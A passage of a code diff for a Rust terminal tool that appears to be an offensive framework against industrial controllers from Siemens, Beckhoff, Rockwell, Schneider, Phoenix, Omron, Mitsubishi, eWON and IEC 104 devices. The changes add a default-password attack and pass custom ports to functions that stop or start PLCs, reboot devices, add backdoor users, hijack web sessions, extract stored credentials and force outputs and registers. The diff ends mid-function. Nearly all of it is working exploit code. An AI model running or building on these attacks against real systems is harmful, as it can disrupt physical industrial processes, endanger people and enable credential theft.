@@ -69,6 +69,7 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::new("List Data Blocks"),
             ExploitDef::with_input("Read Data Block", "DB1:0:64"),
             ExploitDef::with_input("Write Data Block", "DB1:0:deadbeef"),
+            ExploitDef::new("Try Default Passwords"),
         ],
         "schneider" | "modicon" => vec![
             ExploitDef::new("Flash LED"),
@@ -138,6 +139,12 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
     defs
 }
 
+const ALL_VENDORS: &[&str] = &[
+    "siemens", "beckhoff", "rockwell", "enip",
+    "schneider", "modicon", "mitsubishi", "phoenix",
+    "omron", "ewon", "iec104",
+];
+
 const SCAN_ITEMS: &[&str] = &[
     "All vendors (parallel broadcast)",
     "Beckhoff TwinCAT   (UDP 48899)",
@@ -159,6 +166,7 @@ enum Mode {
     ScanMenu,
     ExploitMenu,
     ExploitInput,
+    VendorPicker,
     Search,
     Help,
     OutputZoom,
@@ -180,6 +188,8 @@ struct App {
     scan_menu_sel: usize,
     exploit_defs: Vec<ExploitDef>,
     exploit_sel: usize,
+    vendor_override: Option<String>,
+    vendor_pick_sel: usize,
     filter: String,
     filtered_indices: Vec<usize>,
     active_jobs: u32,
@@ -211,6 +221,8 @@ impl App {
             scan_menu_sel: 0,
             exploit_defs: Vec::new(),
             exploit_sel: 0,
+            vendor_override: None,
+            vendor_pick_sel: 0,
             filter: String::new(),
             filtered_indices,
             active_jobs: 0,
@@ -227,7 +239,16 @@ impl App {
     }
 
     fn selected_vendor(&self) -> Option<String> {
-        self.selected_device().map(|d| d.vendor.clone())
+        self.vendor_override.clone()
+            .or_else(|| self.selected_device().map(|d| d.vendor.clone()))
+    }
+
+    fn device_port(&self, default: u16) -> u16 {
+        self.selected_device()
+            .and_then(|d| d.fields.get("port"))
+            .and_then(|v| v.as_u64())
+            .and_then(|n| u16::try_from(n).ok())
+            .unwrap_or(default)
     }
 
     fn rebuild_filtered(&mut self) {
@@ -305,8 +326,9 @@ impl App {
     }
 
     fn open_exploit_menu(&mut self) {
-        if let Some(dev) = self.selected_device() {
-            self.exploit_defs = exploits_for(&dev.vendor);
+        if let Some(vendor) = self.selected_device().map(|d| d.vendor.clone()) {
+            self.vendor_override = None;
+            self.exploit_defs = exploits_for(&vendor);
             self.exploit_sel = 0;
             self.mode = Mode::ExploitMenu;
         }
@@ -521,7 +543,7 @@ fn fmt_tag_row(instance_id: i64, name: &str, base: &str, dims: &str, value: &str
     )
 }
 
-fn run_exploit_for(vendor: &str, idx: usize, ip: &str, input: &str, label: &str, tx: mpsc::Sender<ScanEvent>) {
+fn run_exploit_for(vendor: &str, idx: usize, ip: &str, port: u16, input: &str, label: &str, tx: mpsc::Sender<ScanEvent>) {
     let vendor = vendor.to_lowercase();
     let ip = ip.to_string();
     let input = input.to_string();
@@ -529,7 +551,7 @@ fn run_exploit_for(vendor: &str, idx: usize, ip: &str, input: &str, label: &str,
 
     std::thread::spawn(move || {
         let out = |msg: &str| { let _ = tx.send(ScanEvent::Output(msg.to_string())); };
-        dispatch_exploit(&vendor, idx, &ip, &input, out, &tx);
+        dispatch_exploit(&vendor, idx, &ip, port, &input, out, &tx);
         let _ = tx.send(ScanEvent::Done(format!("{label} @ {ip}")));
     });
 }
@@ -539,73 +561,75 @@ fn dispatch_exploit(
     vendor: &str,
     idx: usize,
     ip: &str,
+    port: u16,
     input: &str,
     out: impl Fn(&str),
     tx: &mpsc::Sender<ScanEvent>,
 ) {
     match (vendor, idx) {
-        ("beckhoff", 0) => exploit_beckhoff_info(ip, &out),
-        ("beckhoff", 1) => exploit_beckhoff_state(ip, "run", &out),
-        ("beckhoff", 2) => exploit_beckhoff_state(ip, "config", &out),
-        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, &out),
-        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, input, &out),
-        ("siemens", 0) => exploit_siemens_cpu(ip, input, &out),
-        ("siemens", 1) => exploit_siemens_io(ip, input, &out),
-        ("siemens", 2) => exploit_siemens_toggle(ip, input, &out),
+        ("beckhoff", 0) => exploit_beckhoff_info(ip, port, &out),
+        ("beckhoff", 1) => exploit_beckhoff_state(ip, port, "run", &out),
+        ("beckhoff", 2) => exploit_beckhoff_state(ip, port, "config", &out),
+        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, port, &out),
+        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, port, input, &out),
+        ("siemens", 0) => exploit_siemens_cpu(ip, port, input, &out),
+        ("siemens", 1) => exploit_siemens_io(ip, port, input, &out),
+        ("siemens", 2) => exploit_siemens_toggle(ip, port, input, &out),
         ("schneider", 0) | ("modicon", 0) => exploit_schneider_flash(ip, &out),
-        ("schneider", 1) | ("modicon", 1) => exploit_schneider_hijack_info(ip, &out),
-        ("schneider", 2) | ("modicon", 2) => exploit_schneider_action(ip, "stop", &out),
-        ("schneider", 3) | ("modicon", 3) => exploit_schneider_action(ip, "run", &out),
-        ("phoenix", 0) => exploit_phoenix_passwords(ip, &out),
-        ("phoenix", 1) => exploit_phoenix_list_tags(ip, &out),
-        ("phoenix", 2) => exploit_phoenix_read_tags(ip, &out),
-        ("phoenix", 3) => exploit_phoenix_write_tag(ip, input, &out),
-        ("phoenix", 4) => exploit_phoenix_info(ip, &out),
-        ("ewon", 0) => exploit_ewon_creds(ip, input, &out),
-        ("rockwell", 0) | ("enip", 0) => exploit_rockwell_identity(ip, &out),
-        ("rockwell", 1) | ("enip", 1) => exploit_rockwell_tags(ip, &out),
-        ("rockwell", 2) | ("enip", 2) => exploit_rockwell_read(ip, input, &out),
-        ("rockwell", 3) | ("enip", 3) => exploit_rockwell_write(ip, input, &out),
+        ("schneider", 1) | ("modicon", 1) => exploit_schneider_hijack_info(ip, port, &out),
+        ("schneider", 2) | ("modicon", 2) => exploit_schneider_action(ip, port, "stop", &out),
+        ("schneider", 3) | ("modicon", 3) => exploit_schneider_action(ip, port, "run", &out),
+        ("phoenix", 0) => exploit_phoenix_passwords(ip, port, &out),
+        ("phoenix", 1) => exploit_phoenix_list_tags(ip, port, &out),
+        ("phoenix", 2) => exploit_phoenix_read_tags(ip, port, &out),
+        ("phoenix", 3) => exploit_phoenix_write_tag(ip, port, input, &out),
+        ("phoenix", 4) => exploit_phoenix_info(ip, port, &out),
+        ("ewon", 0) => exploit_ewon_creds(ip, port, input, &out),
+        ("rockwell", 0) | ("enip", 0) => exploit_rockwell_identity(ip, port, &out),
+        ("rockwell", 1) | ("enip", 1) => exploit_rockwell_tags(ip, port, &out),
+        ("rockwell", 2) | ("enip", 2) => exploit_rockwell_read(ip, port, input, &out),
+        ("rockwell", 3) | ("enip", 3) => exploit_rockwell_write(ip, port, input, &out),
         ("mitsubishi", 0) => exploit_mitsubishi_info(ip, &out),
         ("mitsubishi", 1) => exploit_mitsubishi_state(ip, "run", &out),
         ("mitsubishi", 2) => exploit_mitsubishi_state(ip, "stop", &out),
-        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, &out),
+        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, port, &out),
         ("beckhoff", 6) => exploit_beckhoff_add_route(ip, input, &out),
-        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, &out),
-        ("siemens", 3) => exploit_siemens_set_outputs(ip, input, &out),
-        ("siemens", 4) => exploit_siemens_set_merkers(ip, input, &out),
-        ("siemens", 5) => exploit_siemens_list_dbs(ip, input, &out),
-        ("siemens", 6) => exploit_siemens_read_db(ip, input, &out),
-        ("schneider", 4) | ("modicon", 4) => exploit_modbus_holding(ip, input, &out),
-        ("schneider", 5) | ("modicon", 5) => exploit_modbus_coils(ip, input, &out),
-        ("schneider", 6) | ("modicon", 6) => exploit_modbus_input(ip, input, &out),
-        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, input, &out),
-        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, input, &out),
+        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, port, &out),
+        ("siemens", 3) => exploit_siemens_set_outputs(ip, port, input, &out),
+        ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, &out),
+        ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, &out),
+        ("siemens", 6) => exploit_siemens_read_db(ip, port, input, &out),
+        ("schneider", 4) | ("modicon", 4) => exploit_modbus_holding(ip, port, input, &out),
+        ("schneider", 5) | ("modicon", 5) => exploit_modbus_coils(ip, port, input, &out),
+        ("schneider", 6) | ("modicon", 6) => exploit_modbus_input(ip, port, input, &out),
+        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, port, input, &out),
+        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, port, input, &out),
         ("mitsubishi", 3) => exploit_mitsubishi_set_pause(ip, &out),
-        ("mitsubishi", 4) => exploit_mitsubishi_read_d(ip, input, &out),
-        ("mitsubishi", 5) => exploit_mitsubishi_read_m(ip, input, &out),
-        ("mitsubishi", 6) => exploit_slmp_write_d(ip, input, &out),
-        ("mitsubishi", 7) => exploit_slmp_write_m(ip, input, &out),
-        ("siemens", 7) => exploit_siemens_write_db(ip, input, &out),
-        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, input, &out),
-        ("schneider", 7) | ("modicon", 7) => exploit_modbus_write_coil(ip, input, &out),
-        ("schneider", 8) | ("modicon", 8) => exploit_modbus_write_register(ip, input, &out),
-        ("schneider", 9) | ("modicon", 9) => exploit_modbus_write_registers(ip, input, &out),
-        ("schneider", 10) | ("modicon", 10) => exploit_fc90_stop(ip, &out),
-        ("schneider", 11) | ("modicon", 11) => exploit_fc90_start(ip, &out),
-        ("schneider", 12) | ("modicon", 12) => exploit_fc90_stop_tm221(ip, &out),
-        ("schneider", 13) | ("modicon", 13) => exploit_fc90_start_tm221(ip, &out),
-        ("schneider", 14) | ("modicon", 14) => exploit_fc90_force(ip, input, &out),
-        ("omron", 0) => exploit_omron_info(ip, &out),
-        ("omron", 1) => exploit_omron_read_dm(ip, input, &out),
-        ("omron", 2) => exploit_omron_write_dm(ip, input, &out),
-        ("omron", 3) => exploit_omron_cpu_status(ip, &out),
-        ("omron", 4) => exploit_omron_cpu_run(ip, &out),
-        ("omron", 5) => exploit_omron_cpu_stop(ip, &out),
-        ("iec104", 0) => exploit_iec104_gi(ip, &out),
-        ("iec104", 1) => exploit_iec104_sc_on(ip, input, &out),
-        ("iec104", 2) => exploit_iec104_sc_off(ip, input, &out),
-        ("iec104", 3) => exploit_iec104_dc(ip, input, &out),
+        ("mitsubishi", 4) => exploit_mitsubishi_read_d(ip, port, input, &out),
+        ("mitsubishi", 5) => exploit_mitsubishi_read_m(ip, port, input, &out),
+        ("mitsubishi", 6) => exploit_slmp_write_d(ip, port, input, &out),
+        ("mitsubishi", 7) => exploit_slmp_write_m(ip, port, input, &out),
+        ("siemens", 7) => exploit_siemens_write_db(ip, port, input, &out),
+        ("siemens", 8) => exploit_siemens_try_defaults(ip, port, &out),
+        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, port, input, &out),
+        ("schneider", 7) | ("modicon", 7) => exploit_modbus_write_coil(ip, port, input, &out),
+        ("schneider", 8) | ("modicon", 8) => exploit_modbus_write_register(ip, port, input, &out),
+        ("schneider", 9) | ("modicon", 9) => exploit_modbus_write_registers(ip, port, input, &out),
+        ("schneider", 10) | ("modicon", 10) => exploit_fc90_stop(ip, port, &out),
+        ("schneider", 11) | ("modicon", 11) => exploit_fc90_start(ip, port, &out),
+        ("schneider", 12) | ("modicon", 12) => exploit_fc90_stop_tm221(ip, port, &out),
+        ("schneider", 13) | ("modicon", 13) => exploit_fc90_start_tm221(ip, port, &out),
+        ("schneider", 14) | ("modicon", 14) => exploit_fc90_force(ip, port, input, &out),
+        ("omron", 0) => exploit_omron_info(ip, port, &out),
+        ("omron", 1) => exploit_omron_read_dm(ip, port, input, &out),
+        ("omron", 2) => exploit_omron_write_dm(ip, port, input, &out),
+        ("omron", 3) => exploit_omron_cpu_status(ip, port, &out),
+        ("omron", 4) => exploit_omron_cpu_run(ip, port, &out),
+        ("omron", 5) => exploit_omron_cpu_stop(ip, port, &out),
+        ("iec104", 0) => exploit_iec104_gi(ip, port, &out),
+        ("iec104", 1) => exploit_iec104_sc_on(ip, port, input, &out),
+        ("iec104", 2) => exploit_iec104_sc_off(ip, port, input, &out),
+        ("iec104", 3) => exploit_iec104_dc(ip, port, input, &out),
         _ => {
             // Auto-detect rescan: emit a DeviceFound event
             out(&format!("[*] Auto-detecting {}...", ip));
@@ -619,7 +643,7 @@ fn dispatch_exploit(
     }
 }
 
-fn exploit_beckhoff_info(ip: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Discovering Beckhoff at {ip}..."));
@@ -627,9 +651,9 @@ fn exploit_beckhoff_info(ip: &str, out: &impl Fn(&str)) {
         .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
     {
         Some(dev) => {
-            let state = scan::get_state(&dev, &local_netid);
+            let state = scan::get_state(&dev, &local_netid, port);
             out(&format!("  State:   {state}"));
-            match scan::get_device_info_full(&dev, &local_netid) {
+            match scan::get_device_info_full(&dev, &local_netid, port) {
                 Some(info) => {
                     out(&format!("  Name:    {}", info.name));
                     out(&format!("  NetID:   {}", info.netid));
@@ -643,12 +667,12 @@ fn exploit_beckhoff_info(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_beckhoff_state(ip: &str, state: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
     match scan::discover_ip(ip, 3, true).ok().and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) }) {
-        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state) {
+        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state, port) {
             Ok(_) => out(&format!("[+] State command sent ({state})")),
             Err(e) => out(&format!("[-] {e}")),
         },
@@ -656,33 +680,34 @@ fn exploit_beckhoff_state(ip: &str, state: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_beckhoff_reboot(ip: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::webcontrol;
     out(&format!("[*] Sending reboot to {ip}..."));
-    match webcontrol::reboot(ip) {
+    match webcontrol::reboot(ip, port) {
         Ok(true) => out("[+] Reboot command sent"),
         Ok(false) => out("[!] Sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_beckhoff_adduser(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::webcontrol;
     let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
     out(&format!("[*] Adding user '{uname}' to {ip}..."));
-    match webcontrol::add_user(ip, uname, pass) {
+    match webcontrol::add_user(ip, port, uname, pass) {
         Ok(true) => out("[+] User creation command sent"),
         Ok(false) => out("[!] Sent — no confirmation"),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_siemens_cpu(ip: &str, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_cpu(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
-    out(&format!("[*] Reading CPU state from {ip}..."));
-    let state = s7comm::get_cpu_state(ip, 102, 5, None);
+    let port = if port == 0 { 102 } else { port };
+    out(&format!("[*] Reading CPU state from {ip}:{port}..."));
+    let state = s7comm::get_cpu_state(ip, port, 5, None);
     if state == "Unknown" {
-        if s7comm::probe_auth_required(ip, 102, 5) {
+        if s7comm::probe_auth_required(ip, port, 5) {
             out("[-] Access denied — retry via CLI with --password");
         } else {
             out("[-] Could not read CPU state");
@@ -692,10 +717,11 @@ fn exploit_siemens_cpu(ip: &str, _input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_siemens_io(ip: &str, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
-    out(&format!("[*] Reading I/O from {ip}..."));
-    let data = s7comm::read_all_data(ip, 102, 5, None);
+    let port = if port == 0 { 102 } else { port };
+    out(&format!("[*] Reading I/O from {ip}:{port}..."));
+    let data = s7comm::read_all_data(ip, port, 5, None);
     let [hdr, sep] = io_header();
     let mut all_addrs: Vec<String> = Vec::new();
     let mut all_vals: Vec<String> = Vec::new();
@@ -727,7 +753,7 @@ fn exploit_siemens_io(ip: &str, _input: &str, out: &impl Fn(&str)) {
     }
 
     if !has_any {
-        if s7comm::probe_auth_required(ip, 102, 5) {
+        if s7comm::probe_auth_required(ip, port, 5) {
             out("[-] Access denied — retry via CLI with --password");
         } else {
             out("[-] No I/O data received");
@@ -742,12 +768,13 @@ fn exploit_siemens_io(ip: &str, _input: &str, out: &impl Fn(&str)) {
     save_and_diff(ip, "s7", &points, out);
 }
 
-fn exploit_siemens_toggle(ip: &str, _input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_toggle(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
-    out(&format!("[*] Toggling CPU state on {ip}..."));
-    if s7comm::change_cpu_state(ip, 102, 5) {
-        out(&format!("[+] New state: {}", s7comm::get_cpu_state(ip, 102, 5, None)));
-    } else if s7comm::probe_auth_required(ip, 102, 5) {
+    let port = if port == 0 { 102 } else { port };
+    out(&format!("[*] Toggling CPU state on {ip}:{port}..."));
+    if s7comm::change_cpu_state(ip, port, 5) {
+        out(&format!("[+] New state: {}", s7comm::get_cpu_state(ip, port, 5, None)));
+    } else if s7comm::probe_auth_required(ip, port, 5) {
         out("[-] Access denied — retry via CLI with --password");
     } else {
         out("[-] Failed to toggle CPU state");
@@ -763,26 +790,26 @@ fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_schneider_hijack_info(ip: &str, out: &impl Fn(&str)) {
+fn exploit_schneider_hijack_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::schneider::session_hijack;
     out(&format!("[*] Getting session cookie from {ip}..."));
-    match session_hijack::get_session_cookie(ip) {
+    match session_hijack::get_session_cookie(ip, port) {
         Some(s) => {
             out(&format!("[+] Cookie:          {}", s.cookie_value));
             out(&format!("    Power-on count:  {}", s.power_on_count));
-            session_hijack::get_device_info(ip, &s.cookie_value, "Administrator");
+            session_hijack::get_device_info(ip, port, &s.cookie_value, "Administrator");
         }
         None => out("[-] Failed to get session cookie"),
     }
 }
 
-fn exploit_schneider_action(ip: &str, action: &str, out: &impl Fn(&str)) {
+fn exploit_schneider_action(ip: &str, port: u16, action: &str, out: &impl Fn(&str)) {
     use crate::vendors::schneider::session_hijack;
     out(&format!("[*] Getting session cookie from {ip}..."));
-    match session_hijack::get_session_cookie(ip) {
+    match session_hijack::get_session_cookie(ip, port) {
         Some(s) => {
             out(&format!("[+] Cookie: {}", s.cookie_value));
-            if session_hijack::control_plc(ip, &s.cookie_value, "Administrator", action) {
+            if session_hijack::control_plc(ip, port, &s.cookie_value, "Administrator", action) {
                 out(&format!("[+] PLC {action} command sent"));
             } else {
                 out(&format!("[-] Failed to {action} PLC"));
@@ -792,10 +819,10 @@ fn exploit_schneider_action(ip: &str, action: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_phoenix_passwords(ip: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::webvisit;
     out(&format!("[*] Retrieving passwords from {ip}..."));
-    match webvisit::retrieve_passwords(ip) {
+    match webvisit::retrieve_passwords(ip, port) {
         Ok(entries) => {
             for e in &entries {
                 if let Some(p) = &e.password {
@@ -810,10 +837,10 @@ fn exploit_phoenix_passwords(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_phoenix_list_tags(ip: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::webvisit;
     out(&format!("[*] Listing tags on {ip}..."));
-    match webvisit::get_tags(ip) {
+    match webvisit::get_tags(ip, port) {
         Ok((project, tags)) => {
             out(&format!("  Project: {project}"));
             for (i, t) in tags.iter().enumerate() {
@@ -825,12 +852,12 @@ fn exploit_phoenix_list_tags(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_phoenix_read_tags(ip: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::webvisit;
     out(&format!("[*] Reading tag values from {ip}..."));
-    let tags_result = webvisit::get_tags(ip);
+    let tags_result = webvisit::get_tags(ip, port);
     match tags_result {
-        Ok((_, tags)) => match webvisit::read_tag_values(ip, &tags) {
+        Ok((_, tags)) => match webvisit::read_tag_values(ip, port, &tags) {
             Ok(vals) => {
                 for (name, val) in &vals {
                     out(&format!("  {name}: {val}"));
@@ -842,20 +869,20 @@ fn exploit_phoenix_read_tags(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_phoenix_write_tag(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::webvisit;
     let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
     out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
-    match webvisit::write_tag_value(ip, tag_name, value) {
+    match webvisit::write_tag_value(ip, port, tag_name, value) {
         Ok(_) => out(&format!("[+] Wrote {tag_name} = {value}")),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_phoenix_info(ip: &str, out: &impl Fn(&str)) {
+fn exploit_phoenix_info(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::phoenix::control;
     out(&format!("[*] Getting device info from {ip}..."));
-    match control::get_device_info(ip, false) {
+    match control::get_device_info(ip, port, false) {
         Ok(info) => {
             out(&format!("  PLC Type: {}", info.plc_type));
             if let Some(fw) = info.firmware { out(&format!("  Firmware: {fw}")); }
@@ -865,7 +892,7 @@ fn exploit_phoenix_info(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_ewon_creds(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::ewon::exploit;
     let (username, max_str) = if input.is_empty() {
         ("adm", "20")
@@ -874,7 +901,7 @@ fn exploit_ewon_creds(ip: &str, input: &str, out: &impl Fn(&str)) {
     };
     let max_users: u32 = max_str.trim().parse().unwrap_or(20);
     out(&format!("[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."));
-    match exploit::exploit(ip, username, max_users) {
+    match exploit::exploit(ip, port, username, max_users) {
         Ok(users) => {
             for u in &users {
                 out(&format!(
@@ -891,10 +918,10 @@ fn exploit_ewon_creds(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_rockwell_identity(ip: &str, out: &impl Fn(&str)) {
+fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::rockwell::driver;
     out(&format!("[*] Getting device identity from {ip}..."));
-    match driver::get_device_info(ip) {
+    match driver::get_device_info(ip, port) {
         Ok(dev) => {
             out(&format!("  Vendor:       {}", dev.vendor));
             out(&format!("  Product Type: {}", dev.product_type));
@@ -907,12 +934,12 @@ fn exploit_rockwell_identity(ip: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_rockwell_tags(ip: &str, out: &impl Fn(&str)) {
+fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::rockwell::driver;
     use std::collections::HashMap;
 
     out(&format!("[*] Enumerating tags on {ip}..."));
-    let tags = match driver::enumerate_tags(ip) {
+    let tags = match driver::enumerate_tags(ip, port) {
         Ok(t) => t,
         Err(e) => { out(&format!("[-] {e}")); return; }
     };
@@ -924,7 +951,7 @@ fn exploit_rockwell_tags(ip: &str, out: &impl Fn(&str)) {
         .filter(|t| t.tag_type & 0x8000 == 0 && t.dimensions == 0)
         .map(|t| t.name.as_str())
         .collect();
-    let raw_values = driver::read_tags_bulk(ip, &scalar_names);
+    let raw_values = driver::read_tags_bulk(ip, port, &scalar_names);
     let value_map: HashMap<&str, String> = scalar_names
         .iter()
         .zip(raw_values.iter())
@@ -1005,7 +1032,7 @@ fn save_tags_and_diff(
     }
 }
 
-fn exploit_rockwell_monitor(ip: &str, out: &impl Fn(&str), stop: Arc<AtomicBool>) {
+fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: Arc<AtomicBool>) {
     use crate::vendors::rockwell::driver;
     use chrono::Local;
 
@@ -1013,7 +1040,7 @@ fn exploit_rockwell_monitor(ip: &str, out: &impl Fn(&str), stop: Arc<AtomicBool>
     out("[*] Fetching baseline tags...");
 
     // Initial baseline scan
-    match driver::enumerate_tags(ip) {
+    match driver::enumerate_tags(ip, port) {
         Ok(tags) => {
             out(&format!("[+] Baseline: {} tags", tags.len()));
             save_tags_and_diff(ip, &tags, out);
@@ -1043,23 +1070,23 @@ fn exploit_rockwell_monitor(ip: &str, out: &impl Fn(&str), stop: Arc<AtomicBool>
         let ts = Local::now().format("%H:%M:%S").to_string();
         out(&format!("[*] Poll #{poll} at {ts}"));
 
-        match driver::enumerate_tags(ip) {
+        match driver::enumerate_tags(ip, port) {
             Ok(tags) => save_tags_and_diff(ip, &tags, out),
             Err(e)   => out(&format!("[-] Poll failed: {e}")),
         }
     }
 }
 
-fn exploit_rockwell_read(ip: &str, tag: &str, out: &impl Fn(&str)) {
+fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &impl Fn(&str)) {
     use crate::vendors::rockwell::driver;
     out(&format!("[*] Reading tag '{tag}' from {ip}..."));
-    match driver::read_tag(ip, tag) {
+    match driver::read_tag(ip, port, tag) {
         Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
         Err(e) => out(&format!("[-] {e}")),
     }
 }
 
-fn exploit_rockwell_write(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::rockwell::driver;
     let (tag_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
     let value_bytes: Vec<u8> = hex_val
@@ -1068,7 +1095,7 @@ fn exploit_rockwell_write(ip: &str, input: &str, out: &impl Fn(&str)) {
         .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
         .collect();
     let type_code: u16 = if value_bytes.len() == 1 { 0x00C1 } else { 0x00C4 };
-    match driver::write_tag(ip, tag_name, type_code, &value_bytes) {
+    match driver::write_tag(ip, port, tag_name, type_code, &value_bytes) {
         Ok(_) => out(&format!("[+] {tag_name}: written")),
         Err(e) => out(&format!("[-] {tag_name}: {e}")),
     }
@@ -1181,14 +1208,14 @@ fn save_and_diff(ip: &str, protocol: &str, points: &[(&str, Option<&str>, &str)]
 
 // ─── New Beckhoff exploits ───────────────────────────────────────────────────
 
-fn exploit_beckhoff_get_state(ip: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
     match scan::discover_ip(ip, 3, true).ok()
         .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
     {
-        Some(dev) => out(&format!("[+] State: {}", scan::get_state(&dev, &local_netid))),
+        Some(dev) => out(&format!("[+] State: {}", scan::get_state(&dev, &local_netid, port))),
         None => out("[-] No Beckhoff device responded"),
     }
 }
@@ -1213,7 +1240,7 @@ fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_beckhoff_symbols(ip: &str, out: &impl Fn(&str)) {
+fn exploit_beckhoff_symbols(ip: &str, port: u16, out: &impl Fn(&str)) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Enumerating ADS symbols on {ip}..."));
@@ -1223,7 +1250,7 @@ fn exploit_beckhoff_symbols(ip: &str, out: &impl Fn(&str)) {
         out("[-] No Beckhoff device responded");
         return;
     };
-    let symbols = scan::enumerate_symbols(&dev, &local_netid);
+    let symbols = scan::enumerate_symbols(&dev, &local_netid, port);
     if symbols.is_empty() {
         out("[-] No symbols returned (device may not support ADS symbol upload)");
         return;
@@ -1247,40 +1274,43 @@ fn exploit_beckhoff_symbols(ip: &str, out: &impl Fn(&str)) {
 
 // ─── New Siemens exploits ────────────────────────────────────────────────────
 
-fn exploit_siemens_set_outputs(ip: &str, input: &str, out: &impl Fn(&str)) {
+fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::siemens::s7comm;
+    let port = if port == 0 { 102 } else { port };
     let args = input.trim();
-    out(&format!("[*] Writing outputs '{args}' to {ip}..."));
-    if s7comm::set_outputs(ip, args, 102, 5, None) {
